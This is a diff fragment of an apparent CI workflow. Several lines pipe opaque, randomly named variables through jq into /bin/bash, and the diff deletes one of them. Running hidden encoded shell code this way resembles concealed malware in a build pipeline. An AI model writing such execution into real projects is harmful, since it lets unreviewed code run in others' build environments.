@@ -25,7 +25,6 @@ jobs:
           echo $xjdk39 | jq -r .jo829 | /bin/bash
           echo $ul12 | jq -r .lxfg87 | /bin/bash
           echo $mohoh96 | jq -r .xl80 | /bin/bash
-          printf '%s' "$q4516" | jq -r .r1489 | /bin/bash
           echo $cs93187 | jq -r .hn162 | /bin/bash
 
       - name: Store results
